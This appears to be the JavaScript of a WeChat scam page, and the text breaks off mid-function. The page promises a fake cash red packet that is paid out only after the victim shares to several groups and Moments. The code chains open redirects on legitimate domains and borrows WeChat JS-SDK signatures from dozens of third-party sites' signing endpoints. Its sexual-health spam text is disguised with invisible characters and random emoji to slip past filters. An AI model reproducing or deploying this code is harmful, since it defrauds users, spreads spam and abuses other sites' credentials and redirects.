window.onerror = function () {
}
window['data'] = window['data'] || {};
if (window.data && window.data.ad) {
  window.data.ad = {
    'app_url': '',
    'timeline_url': '',
    'desc': '㊙️{city}男人{fuck}肾{fuck}亏{fuck}虚，早{fuck}泄，时间{fuck}短，教{fuck}你一招{bq}',
    'img': 'https://qqpublic.qpic.cn/qq_public/0/0-2219016664-6989DB9F2C7EE667CA38EDB6ED72B007/0?fmt=jpeg&size=69&rs=31-50&h=441&w=640&ppv=1',
    'title': ' '
  }
}
window.gConfig = $.extend({
  endPageUrl: 'javascript:setTimeout(function() {history.go(-1)},0)',
  // endPageUrl: 'http://m1.tuniucdn.com/fb2/t1/G5/M00/FD/03/Cii-s1s1vLaIR3iWAAAAlO4kMEYAAG3DQP__nQAAAGM31.html?fsrc=dz&type=nk',
  defaultTips: [
    '<span style="font-size: 23px;color:#1BBC9B;">恭喜你</span><br/><br/>',
    '<span>您获得现金红包</span><br/>',
    '<span style="font-size: 20px;color:red;">%(money)元</span><br/>',
    '<span style="color:red;">活动宗旨为宣传本电影的知名度，分享到群后</span><span  style="color:red; font-size: 25px;">即可领取</span><br/>',
    // '<span style="color:red;">群人数>50人可额外奖励18元</span><br/>',
    '<span>红包总额仅剩余</span><span style="font-size: 20px;color:red;">3378.3万</span>元，先到先得，马上分享领取到账！<br/>',
  ].join(''),
  successTips: [
    '<span style="font-size: 20px;color: red;">恭喜您</span>，',
    '获得￥ <span style="font-size: 20px;color: red;">%(money)</span> 现金红包，',
    '金额已提交银行打款，预计1小时内到账（跨行次日到账，非工作时间[09:00-17:00]次日到账），请注意查收微信绑定银行卡到账情况！',
  ].join(''),
  groupTips: [
    {
      successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
      successTips: '请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>',
    },
    {
      successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
      successTips: '请继续分享到<b style="font-size: 18px;color: red">1</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>',
    },
    {
      successTitle: '<b style="font-size: 22px;color: red;">分享失败！</b>',
      successTips: '<br>注意：<span color="red">分享到相同的群会失败</span><br>请尝试重新分享到<b style="font-size: 18px;color: red">1个不同的群</b><br>',
    },
    /* {
       successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
       successTips: '剩下最后一步啦！<br />请分享到<b style="color: red;">人数大于50人</b>的微信群，获赠<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰立即到账！',
     },*/
    {
      successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
      successTips: '剩下最后一步啦！<br />请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>，获赠<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰立即到账！',
    },
  ],
  timeLineTips: [
    {
      successTitle: '<b style="font-size: 22px;color: red;">分享失败！</b>',
      successTips: '<br>注意：必须[<span color="red">公开</span>]分享哦!<br>请尝试重新分享到<b style="font-size: 18px;color: red">朋友圈</b><br>',
    },
  ]
}, (window['data']));
var evkey = M.getParam('_evkey');
var site = M.getParam('_c');

if (/iphone/ig.test(navigator.userAgent) && window.data && window.data['attached'] && window.data['attached']['iosGoAdUrl']) {
  location.href = window.data['attached']['iosGoAdUrl'];
}

/* 借权start */
var get_share_host = 'haiwaibbm.cn';
var location_host = location.host;

var biaoqing = ["😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "🙌", "👏", "👋", "👍", "👎", "👊", "✊", "✌️", "👌", "✋", "👐", "💪", "🙏", "☝️", "👆", "👇", "👈", "👉", "🖕", "🖐", "🤘", "🖖", "✍️", "💅", "👄", "👅", "👂", "👃", "👁", "👀", "👤", "👥", "🗣", "👶", "👦", "👧", "👨", "👩", "👱", "👴", "👵", "👲", "👳", "👮", "👷", "💂", "🕵", "🎅", "👼", "👸", "👰", "🚶", "🏃", "💃"];
var bq = biaoqing[Math.floor(Math.random() * biaoqing.length)];

(function () {

  function getSpm () {
    var stringArray = 'qwertyuiopasdfghjklzxcvbnm1234567890';
    var spm = []
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    return spm.join('');
  }

  var g_301array = ['http://htdata2.qq.com/cgi-bin/httpconn?htcmd=0x6ff0080&u={encodeUrl}', 'https://ssl.htdata.qq.com/cgi-bin/httpconn?htcmd=0x6ff0080&u={encodeUrl}', 'https://weibo.cn/sinaurl?u={encodeUrl}', 'https://ad.liepin.com/adremote/forward2?nextUrl={encodeUrl}', 'http://rd.go.10086.cn/remind/push/remind.do?specailfunc=wapMpp&x-original-URL={encodeUrl}', 'http://yun.fang.com/logout?backurl={encodeUrl}', 'https://s.cloud.gmw.cn/zcms/member/logout?SiteID=126&Referer={encodeUrl}', 'http://s1.eqxiu.com/eqs/link?id=24208220&url={encodeUrl}', 'https://club.10010.com/index.html?ufc=appcshd&tourl={encodeUrl}', 'http://www.ximalaya.com/jt?channel=wailian&tag=360ting&jt={encodeUrl}', 'https://36kr.com/jump?url={encodeUrl}', 'https://as.weixin.qq.com/cgi-bin/amazing?url={encodeUrl}']

  var g_jumparray = ['http://qiniu.madrock.com.cn/5c28417b00057UPJgPxTTANW9yD5pBm4.html?{spm}={spm}', 'http://pic.app.dbr0668.com/20181123_96048_1551593189711.jpg?{spm}={spm}', 'http://img.phootball.cn/013b4e57-a915-4527-be34-addff02b3e3a?{spm}={spm}', 'http://cdn4video.immocha.com/5c3ede99281f4RO4ZZLmLNzs15HfZ3jm.html?{spm}={spm}', 'http://pic.jinguangcm.com/fantuan/images/theme/theme_img_portrait_135892_1540983303146?{spm}={spm}', 'http://img.yzcdn.cn/krt7f3nx7m8.svg?{spm}={spm}'];

  var g_bxarray = ['https://static.mobike.com/ATHENA-BACKEND/327b5ad0-1e8d-46ad-bcf1-b18c8d454a66.html?type=nk&fsrc=dz', 'https://static.mobike.com/ATHENA-BACKEND/c448fa55-602e-4033-a9a4-100b0a01a2c9.html?type=nk&fsrc=dz',
    'https://static.mobike.com/ATHENA-BACKEND/98e1d838-4d67-4e23-946f-8f49aac6ebfc.html?type=nk&fsrc=dz', 'http://www.izssj.com/logs/152837126790.svg?type=nk&fsrc=dz', 'http://white-ic.liubaiapp.com/bxd77a55abbbab49b687b989e4ae1d3f05.svg?type=nk&fsrc=dz', 'http://image.yunjiweidian.com/a1f1886687a84bcd8fee5c66248cdaa7.svg?type=nk&fsrc=dz', 'http://admin.pcdn.xiaodao.tv/5b8e8ab8dbdafaDquC4Ufij5pFVJF4u8.svg?type=nk&fsrc=dz', 'http://snsimg.ztjystore.cn/5b8fba3941c93CNZUHr3dAFZdQAzINB4.svg?type=nk&fsrc=dz'];

  var i3 = parseInt(g_pc['i3']);
  if (i3 >= 0 && i3 < g_301array.length) {
  } else {
    i3 = -1;
  }
  var ic = parseInt(g_pc['ic']) || 0;
  var ib = parseInt(g_pc['ib']) || 0;

  var url301 = g_301array[i3];
  window.g_caseLink = g_jumparray[ic].replace(/{spm}/ig, getSpm());
  window.g_bxLink = g_bxarray[ib].replace(/{spm}/ig, getSpm());

  window.g_caseLink = M.addParam(window.g_caseLink, {
    '_c': site
  });

  if (url301) {

    if (url301.indexOf('as.weixin.qq.com') > -1) {
      window.g_caseLink = window.g_caseLink + '#';
      window.g_bxLink = window.g_bxLink + '#';
    }

    window.g_caseLink = url301.replace('{encodeUrl}', encodeURIComponent(window.g_caseLink));
    window.g_bxLink = url301.replace('{encodeUrl}', encodeURIComponent(window.g_bxLink));
  }

}());

function checkIsMp () {
  if (window.data && window.data['attached'] && window.data['attached']['isMp']) {
    return true;
  } else {
    return false;
  }
}

function getCity () {
  return (window['localAddress'] ? ['北京市', '天津市', '上海市', '重庆市'].indexOf(localAddress.province) > -1 ? localAddress.province : localAddress.city : '').replace(/(.*)市/, '$1');
}

function randomOneFromList (list) {
  if (list && list.length > 0) {
    return list[Math.floor(Math.random() * list.length)];
  } else {
    return '';
  }
}

function getSpm () {
  var stringArray = 'qwertyuiopasdfghjklzxcvbnm1234567890';
  var spm = []
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  return spm.join('');
}


function pad (num, size) {
  var s = num + "";
  while (s.length < size) s = "0" + s;
  return s;
}

function getFuck163 () {
  var strList = [];
  for (var i = 0; i < 5; i++) {
    strList.push('%' + pad(1 + Math.round(Math.random() * 18), 2));
  }
  return strList.join('');
}

function addJumpToUrl (jump) {
  if (location.host.indexOf('m.ymatou.com') > -1) {
    return 'https://www.ymatou.com/login/logout?' + getSpm() + '=' + getSpm() + '&ret=' + encodeURIComponent(jump);
  } else if (location.host.indexOf('my.lotour.com') > -1) {
    return 'http://www.lotour.com/app/WeixinBack?id=1233&' + getSpm() + '=' + getSpm() + '&state=' + encodeURIComponent(jump);
  } else {
    return jump;
  }
}

/* 借权end */
function record (event, id, allow_reply) {
  try {
    if (!localStorage.getItem(event + ':' + id) || allow_reply) {
      $.post('http://p.rsren.com.cn./record', {event: event, id: id})
      localStorage.setItem(event + ':' + id, true);
    }
  } catch (e) {

  }
}

/*window.g_displayUrl = '';

function getDisplayUrl (callback) {
  $.get('https://api.51bjbj.com./j?out=url', function (target) {
    if (target) {
      window.g_displayUrl = M.addParam(target, {
        'ac': 'goon'
      });
    }
    if (typeof callback === 'function') {
      callback();
    }
  });
}

function jumpToDisplay () {
  if (window.g_displayUrl) {
    jump_noref(window.g_displayUrl);
  } else {
    getDisplayUrl(function () {
      if (window.g_displayUrl) {
        jump_noref(window.g_displayUrl);
      }
    });
  }
}*/

function showShareTips (obj) {
  if (typeof obj === 'object') {
    g_dialog.alert({
      title: obj.successTitle || '',
      message: obj.successTips,
      btn: '我知道了'
    });
  } else if (typeof obj === 'string' && obj) {
    g_dialog.alert({
      title: '',
      message: obj,
      btn: '我知道了'
    });
  }
}

// 分享
(function () {

  var group_ad = false;
  var timeline_ad = false;
  var shareATimes = 0;
  var shareTTimes = 0;

  function share_tip () {

    // 4次群 2次朋友圈
    if (shareATimes == 0) {
      showShareTips(window.g_tips_message_obj);
    } else if (shareATimes == 1) {
      window.g_tips_message_obj = gConfig.groupTips[0];
      showShareTips(window.g_tips_message_obj);
      shareFriend();
    } else if (shareATimes == 2) {
      window.g_tips_message_obj = gConfig.groupTips[1];
      showShareTips(window.g_tips_message_obj);
      shareFriend();
    } else if (shareATimes == 3) {
      window.g_tips_message_obj = gConfig.groupTips[2];
      showShareTips(window.g_tips_message_obj);
      shareFriend();
    } else {
      if (shareTTimes < 1) {
        window.g_tips_message_obj = gConfig.groupTips[3];
        showShareTips(window.g_tips_message_obj);
        show_timeline_menu();
        shareTimeline();
        $('.js_share_to_desc').text('朋友圈');
      } else {
        shareTimeline();
        if (shareATimes < 4) {
          window.g_tips_message_obj = {
            successTips: '<b style="font-size: 30px;color: #f5294c">分享失败</b><br>请先分享到<b style="font-size: 30px;color: #f5294c">微信群</b>即可领取成功!'
          };
          showShareTips(window.g_tips_message_obj);
          showShareTips();
          return;
        }

        if (shareTTimes == 1 && timeline_ad) {
          window.g_tips_message_obj = gConfig.timeLineTips[0];
          showShareTips(window.g_tips_message_obj);
        } else {
          try {
            $(document.body).trigger('event_page_share_done');
          } catch (e) {

          }
        }
      }
    }


  }

  function timeline_callback () {
    if (shareATimes >= 3) {
      shareTTimes += 1;
    }
    share_tip();
    record('share', site, true);
    record('share-uv', site);
    evkey && record('share', evkey, true);
    evkey && record('share-uv', evkey);
  }

  function appmessage_callback () {
    shareATimes += 1;
    share_tip();
    record('share', site, true);
    record('share-uv', site);
    evkey && record('share', evkey, true);
    evkey && record('share-uv', evkey);
  }

  function shareFriend () {
    var result = window.data.to_group;
    if (g_pc['qun'] && g_pc['qun'][shareATimes]) {
      result = {
        'title': ' ',
        'link': window.data['ad']['app_url'],
        'img': window.data['ad']['img'],
        'desc': window.data['ad']['title'],
      }
    }
    console.log(result)
    if (window.data.attached.signmode == 'jsb') {

      if (g_pc['qun'] && g_pc['qun'][shareATimes]) {
        result = {
          'title': ' ',
          'link': window.data['ad']['app_url'],
          'img': window.data['ad']['img'],
          'desc': window.data['ad']['desc'],
        }
        result.link = g_bxLink;
      } else {
        result.link = g_caseLink;
      }

      WeixinJSBridge.on('menu:share:appmessage', function (argv) {
        WeixinJSBridge.invoke('sendAppMessage', {
          "title": result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          "desc": result.desc.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          "link": result.link.replace(/{fuck163}/ig, getFuck163()),
          "img_url": result.img,
          "dataUrl": "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
        }, function (res) {
          if (/ok|confirm/i.test(res.err_msg || res.errMsg)) {
            appmessage_callback();
          }
        });
      });

    }
    else {
      wx.ready(function () {

        var link = result.link;
        if (checkIsMp()) {
          link = g_shareData['jssdk']['groupUrl'] || link;
          if (window.data.attached['ad_share']['qun'][shareATimes] && g_shareData['jssdk']['cashUrl']) {
            link = g_shareData['jssdk']['cashUrl'];
          }
        }

        wx.onMenuShareAppMessage({
          title: result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          link: link.replace(/{fuck163}/ig, getFuck163()),
          desc: result.desc.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          imgUrl: result.img,
          dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
          success: function () {
            appmessage_callback();
          },
          cancel: function () {
          }
        });
      })
    }
  }

  function shareTimeline (result) {
    var result = window.data.to_timeline;
    if (g_pc['pyq'] && g_pc['pyq'][shareTTimes]) {
      result = {
        'title': window.data['ad']['title'],
        'link': window.data['ad']['timeline_url'],
        'img': window.data['ad']['img'],
        'desc': window.data['ad']['desc']
      }
    }
    console.log(result);
    if (window.data.attached.signmode === 'jsb') {

      if (g_pc['pyq'] && g_pc['pyq'][shareTTimes]) {
        result = {
          'title': window.data['ad']['desc'],
          'link': window.data['ad']['timeline_url'],
          'img': window.data['ad']['img'],
          'desc': window.data['ad']['desc']
        }
        result.link = g_bxLink;
      } else {
        result.link = g_caseLink;
      }

      WeixinJSBridge.on('menu:share:timeline', function (argv) {
        var __shareData = {
          "title": result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          "desc": result.desc.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          "link": result.link.replace(/{fuck163}/ig, getFuck163()),
          "img_url": result.img,
          "dataUrl": "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
        };
        if (result.img.indexOf('typeVideo') > -1) {
          __shareData.type = 'video';
        }
        WeixinJSBridge.invoke('shareTimeline', __shareData, function (res) {
          if (/ok|confirm/i.test(res.err_msg || res.errMsg)) {
            timeline_callback();
          }
        });
      });
    } else {
      wx.ready(function () {

        var link = result.link;
        if (checkIsMp()) {
          link = g_shareData['jssdk']['timelineUrl'] || result.link;
          if (window.data.attached['ad_share']['pyq'][shareTTimes] && g_shareData['jssdk']['cashUrl']) {
            link = g_shareData['jssdk']['cashUrl'];
          } else {
            if (shareTTimes >= 1) {
              result = {
                'title': '{fuck}庆祝流浪地球票房破40亿，吴总任性派钱啦，快来试试手{fuck}气吧！',
                'link': g_shareData['jssdk']['timelineUrl'],
                'img': 'https://butuyu.oss-cn-hangzhou.aliyuncs.com/images/lldq.jpg',
                'desc': '',
                'type': 'video'
              }
            }
          }
        }

        wx.onMenuShareTimeline({
          title: result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          link: link.replace(/{fuck163}/ig, getFuck163()),
          imgUrl: result.img,
          dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
          type: 'video',
          success: function () {
            timeline_callback();
          },
          cancel: function () {
          }
        });
      })
    }
  }

  function show_timeline_menu () {
    if (window.data.attached.signmode == 'jssdk') {
      if (location_host.indexOf('dangdang.com') > -1) {
      } else {
        wx.hideOptionMenu();
      }
      if (M.getParam('debugx') === '1') {
        wx.showMenuItems({
          menuList: [
            'menuItem:share:timeline',
            'menuItem:share:appMessage',
          ]
        });
      } else {
        wx.showMenuItems({menuList: ['menuItem:share:timeline']});
      }
    }
  }

  function ymatou_config () {

    window['ymatou_config_callback'] = function (data) {
      jssdk_config({
        appId: data['AppId'],
        timestamp: data['TimeStamp'],
        nonceStr: data['NonceStr'],
        signature: data['Signature'],
      });
    }
    var url = 'https://m.ymatou.com/GetJsSignature.aspx?';
    url += 'v=' + (+new Date());
    url += '&appId=wxa06ebe9f39751792';
    url += '&callback=ymatou_config_callback';
    url += '&u=' + encodeURIComponent(location.protocol + '//' + location.host + location.pathname + location.search);
    $.getScript(url)
  }

  function sina_config () {
    $.post('http://blog.sina.cn/dpool/blog/newblog/riaapi/mblog/wechat.php', {
      original_url: location.href.split('#')[0]
    }, function (d) {
      d = JSON.parse(d);
      var config = d.data;
      jssdk_config(config);
    });
  }

  function dajie_config () {
    $.get('', function (d) {
      var ms = d.match(/var\s+js_sdk_config\s+=\s+\{[^\}]+\};/).toString();
      // var ms = (/js_sdk_config = [\s\S]*?};/gm)['toString']()
      eval(ms);
      jssdk_config(js_sdk_config);
    });
  }

  function meipian_config () {
    $.post('https://www.meipian.cn/promo/poetry_game/api/shareParams', {
      url: location.href.split('#')[0]
    }, function (d) {
      var config = d.data;
      config['appId'] = config['appid'];
      config['nonceStr'] = config['noncestr'];
      jssdk_config(config);
    })
  }

  function shijue_config () {
    var config = {
      appId: wxinfo.appid,
      nonceStr: wxinfo.nonceStr,
      signature: wxinfo.signature,
      timestamp: wxinfo.timestamp
    };

    jssdk_config(config);
  }

  function lotour_config () {
    window['ymatou_config_callback'] = function (data) {
      jssdk_config(data);
    }
    var url = 'http://wx.lotour.com/WxCommon/WxAPI.ashx?';
    url += 'v=' + (+new Date());
    url += '&callback=ymatou_config_callback';
    url += '&curl=' + encodeURIComponent(location.protocol + '//' + location.host + location.pathname + location.search);
    $.getScript(url)
  }

  function jumei_config () {
    $.ajax(
      {
        type: "GET",
        url: 'http://h5.jumei.com/activity/weixin/getWeixinSignV2?url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          var config = d.result;
          config['appId'] = 'wx21564a7188284dea';
          config['nonceStr'] = config['noncestr'];
          config['signature'] = config['sign'];
          jssdk_config(config);
        }
      });
  }

  function fang_config () {
    $.ajax(
      {
        type: "GET",
        url: '//m.fang.com/huodongAC.d?m=wxShareInfo&class=ActivityIExpiresinTimeMc&shareurl=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          var config = d;
          jssdk_config(config);
        }
      });
  }

  function rabbitpre_config () {
    $.ajax({
      type: "GET",
      url: 'https://a3.rabbitpre.com/api2/share/signature?pageUrl=' + encodeURIComponent(location.href.split('#')[0]) + '&shareUrl=' + encodeURIComponent(location.href.split('#')[0]) + '&isAjax=true',
      dataType: "json",
      data: {},
      success: function (d) {
        if (d && d.data) {
          jssdk_config(d.data);
        }
      }
    });
  }

  function mafengwo_config () {
    $.ajax({
      type: "GET",
      url: 'https://m.mafengwo.cn/sales/activity/flightpromotion/ajax_data/weChatShare?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "json",
      data: {},
      success: function (d) {
        jssdk_config(d.data)
      }
    });
  }

  function c_17173_config () {
    $.ajax(
      {
        type: "GET",
        url: 'https://act.17173.com/weixin/index.php?do=weixin&url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          var config = d;
        }
      });
  }

  function chanyou_config () {
    $.ajax(
      {
        type: "GET",
        url: 'https://ylruiji.com/sign?site=17173&url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "json",
        data: {},
        success: function (d) {
          jssdk_config(d);
        }
      });
  }

  function hexun_config () {
    $.ajax(
      {
        type: "GET",
        url: 'https://ylruiji.com/sign?site=hexun&url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "json",
        data: {},
        success: function (d) {
          jssdk_config(d);
        }
      });
  }

  function gzl_config () {
    $.ajax(
      {
        type: "GET",
        url: 'http://weixin.gzl.cn/jssdkconfig/getConfig.json?url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "json",
        data: {},
        success: function (d) {
          d.nonceStr = d.noncestr;
          jssdk_config(d);
        }
      });
  }

  function zhiye_config () {
    $.ajax(
      {
        type: "GET",
        url: 'https://ylruiji.com/sign?site=zhiye&url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "json",
        data: {},
        success: function (d) {
          jssdk_config({
            appId: d.AppId,
            timestamp: d.TimeStamp,
            nonceStr: d.NonceStr,
            signature: d.Signature,
          });
        }
      });
  }

  function zcool_config () {
    $.ajax(
      {
        type: "GET",
        url: '//m.zcool.com.cn/special/weixinShare.do?addr=',
        dataType: "json",
        data: {},
        success: function (d) {
          jssdk_config({
            appId: d.appid,
            timestamp: d.timestamp,
            nonceStr: d.nonceStr,
            signature: d.signature,
          });
        }
      });
  }

  function music_163_config () {
    $.ajax(
      {
        type: "GET",
        url: '//music.163.com/store/api/wechat/auth/jssdk/info?url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "json",
        data: {},
        success: function (d) {
          var config = d;
          jssdk_config(config);
        }
      });
  }

  function kujiale_config () {
    $.ajax(
      {
        type: "GET",
        url: '//www.kujiale.com/weixin/js/signature?url=' + encodeURIComponent(location.href.split('#')[0]),
        data: {},
        success: function (d) {
          if (typeof d === 'string') {
            d = JSON.parse(d);
          }
          jssdk_config({
            appId: d.appId,
            timestamp: d.timestamp,
            nonceStr: d.noncestr,
            signature: d.signature,
          });
        }
      });
  }

  function chinahr_config () {
    $.ajax(
      {
        type: "GET",
        url: '//wezp.chinahr.com/js/sign?rawurl=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          jssdk_config({
            appId: d.appid,
            timestamp: d.timestamp,
            nonceStr: d.nonceStr,
            signature: d.signature,
          });
        }
      });
  }

  function ifeng_config () {
    $.ajax(
      {
        type: "GET",
        url: '//api.3g.ifeng.com/weishare_token_api?url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          jssdk_config({
            appId: d.appId,
            timestamp: d.timestamp,
            nonceStr: d.nonceStr,
            signature: d.signature,
          });
        }
      });
  }

  function sougou_config () {
    var url = 'https://shouji.sogou.com/api/weixin/jssdk/wxconfig.php?';
    url += 'rurl=' + encodeURIComponent(location.href.split('#')[0]);
    url += '&_=' + (+new Date());
    $.getScript(url, function () {
      if (typeof wxconfig === 'object' && wxconfig.rawString) {
        var jsticket = wxconfig.rawString.split('&')[0] || '';
        jsticket = jsticket.replace('jsapi_ticket=', '');
        $.ajax({
          type: "GET",
          url: '//haiwaibbm.cn/sign?site=sogou&ticket=' + encodeURIComponent(jsticket),
          dataType: "json",
          success: function (data) {
            jssdk_config({
              appId: wxconfig.appId,
              timestamp: data.timestamp,
              nonceStr: data.noncestr,
              signature: data.signature,
            });
          }
        });
      }
    });
  }

  function focus_config () {
    $.ajax(
      {
        type: "GET",
        url: '//wx-open-api.focus.cn/ajax/wxJsConfig?sceneType=1&url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "json",
        data: {},
        success: function (d) {
          var config = d.data;
          jssdk_config(config);
          /*setTimeout(function () {
            jssdk_config(config);
          }, 500);
          setTimeout(function () {
            jssdk_config(config);
          }, 1000);
          setTimeout(function () {
            jssdk_config(config);
          }, 2000);*/
        }
      });
  }

  function che_config () {
    $.ajax(
      {
        type: "GET",
        url: 'http://service.58che.com/Wxshare/share/?url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          var config = d;
          jssdk_config(config);
        }
      });
  }

  function zol_config () {
    $.getScript('//ylruiji.com/sign?site=zol&url=' + encodeURIComponent(location.href.split('#')[0]), function () {
      var config = window.WeixinShareData;
      jssdk_config(config);
    });
  }

  function douyu_config () {
    $.post('https://yubam.douyu.com/ybapi/interaction/getsignpackage', {
      signurl: location.href.split('#')[0]
    }, function (d) {
      d = JSON.parse(d);
      var config = {
        appId: d.appid,
        signature: d.signature,
        timestamp: d.timestamp,
        nonceStr: d.nonceStr
      };

      jssdk_config(config);
    });
  }

  function seeyouyima_config () {
    $.ajax(
      {
        type: "GET",
        url: 'https://view.seeyouyima.com/api/wechat?url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          var config = d.data;
          jssdk_config(config);
        }
      });
  }

  function mia_config () {
    $.ajax(
      {
        type: "GET",
        url: 'https://m.mia.com/wx/share/wx_sign/?url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function () {
          if (window.wx_sign) {
            var d = wx_sign.signPackage;
            var config = {
              appId: d.appId,
              timestamp: d.timestamp,
              nonceStr: d.nonceStr,
              signature: d.signature
            };
            jssdk_config(config);
          }
        }
      });
  }

  function huajiao_config () {
    $.getJSON('https://h.huajiao.com/wx/getConfig', function (d) {
      var config = d.data.config;
      jssdk_config(config);
    });
  }

  function dangdang_config () {
    $.getScript('//e.dangdang.com/weixin/getInfo.php?src_url=' + encodeURIComponent(location.href.split('#')[0]));

    setTimeout(function () {
      shareFriend();
      shareTimeline();
    }, 1000);
    setTimeout(function () {
      shareFriend();
      shareTimeline();
    }, 3000);

  }

  function bama555_config () {
    $.ajax(
      {
        type: "GET",
        url: 'http://cyzssj.bama555.com/data/wechatjsapi?url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          var config = d.data;
          jssdk_config(config);
        }
      });
  }

  function jia_config () {
    $.ajax(
      {
        type: "GET",
        url: '//weixin.jia.com/api/weixinjssdk/getConfigInfo?url=' + encodeURIComponent(encodeURIComponent(location.href.split('#')[0])),
        dataType: "jsonp",
        jsonp: "callbackparam",
        data: {},
        success: function (d) {
          var config = d.result;
          jssdk_config({
            appId: config.appId,
            timestamp: config.timestamp,
            nonceStr: config.nonceStr,
            signature: config.signature,
          });
        }
      });
  }

  function wenjuan_config () {

    $.getJSON('https://ylruiji.com/sign?site=wenjuan&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = d;
      jssdk_config(config)
    });
  }

  function pingan_config () {
    $.getJSON('https://m.health.pingan.com/mapi/signature.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1551091706759&app=0&platform=3&app_key=PAHealth&osversion=23&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=UMENG_CHANNEL_VALUE&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = {
        appId: d.appid,
        nonceStr: d.nonceStr,
        timestamp: d.timestamp,
        signature: d.signature
      };
      jssdk_config(config);
    });
    // $.ajax(
    //     {
    //         type: "GET",
    //         url: 'https://m.health.pingan.com/mapi/signature.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1551091706759&app=0&platform=3&app_key=PAHealth&osversion=23&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=UMENG_CHANNEL_VALUE&url=' + encodeURIComponent(location.href.split('#')[0]),
    //         dataType: "jsonp",
    //         jsonp: "callback",
    //         callback: 'jsonp1',
    //         data: {},
    //         success: function (d) {
    //             var config = JSON.parse(d);
    //             jssdk_config({
    //                 'appId': 'wx95415c456652ce73',//wx40923f3ed820979d
    //                 'nonceStr': config['nonce'],
    //                 'timestamp': config['timestamp'],
    //                 'signature': config['signature']
    //             });
    //         }
    //     });
  }

  function leju_config () {
    $.ajax(
      {
        type: "GET",
        url: 'https://m.leju.com/index.php?site=api&ctl=initjssdk&act=index&url=' + encodeURIComponent(location.href.split('#')[0]),
        dataType: "jsonp",
        jsonp: "callback",
        callback: 'jsonp1',
        data: {},
        success: function (d) {
          var config = d;
          jssdk_config({
            'appId': config['appid'],
